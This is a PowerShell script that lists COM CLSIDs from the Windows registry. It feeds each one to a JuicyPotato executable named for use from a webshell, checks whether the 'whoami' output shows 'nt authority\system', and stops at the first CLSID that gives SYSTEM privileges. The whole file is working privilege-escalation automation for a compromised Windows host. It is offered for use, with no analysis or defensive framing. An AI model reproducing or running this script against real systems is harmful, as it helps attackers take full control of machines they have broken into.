$base = "C:\users\public"
$clsidFile = "$base\CLSID.list"
$log = "$base\result.log"
$port = 10000

# [CORE MODIFICATION 1]
# Automatically clear or create a fresh empty log file before each run
# to prevent stale data from previous executions.

if (Test-Path $log) { Remove-Item $log -Force }
New-Item -Path $log -ItemType File | Out-Null

# 1. Ensure the HKCR drive is mounted and generate the CLSID list.

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null

Get-ItemProperty HKCR:\CLSID\* |
Where-Object { $_.AppID } |
ForEach-Object { $_.PSChildName } |
Out-File -Encoding ASCII $clsidFile

# Wait 2 seconds to ensure the CLSID list has been fully written.

Start-Sleep -Seconds 2

# 2. Read and filter the CLSID list for testing.

if (Test-Path $clsidFile) {
    $clsids = Get-Content $clsidFile

    foreach ($clsid in $clsids) {
        # Execute the original test command.
        $out = & "$base\juicypotato-webshell.exe" -c $clsid -p "whoami" 2>&1 | Out-String
        
        # [CORE MODIFICATION 2]
        # Strict success criteria:
        # The output must contain "nt authority\system"
        # and must not contain connection or execution errors.
        if ($out -like "*nt authority\system*" -and $out -notlike "*Error connect*" -and $out -notlike "*failed*") {
            
            $header = "==== [VULNERABLE & SUCCESS] CLSID: $clsid | PORT: $port ===="
            $header | Out-File -Append -Encoding UTF8 $log
            $out | Out-File -Append -Encoding UTF8 $log
            
            # Display the result on the screen.
            Write-Host ""
            Write-Host "========== RESULT =========="
            Get-Content $log
            Write-Host "============================"
            
            # Stop CLSID testing immediately after a successful result is found.
            break
            
        } else {
            # If SYSTEM privileges are not obtained, treat the attempt as failed,
            # increment the port, and continue silently.
            $port++
        }
    }
}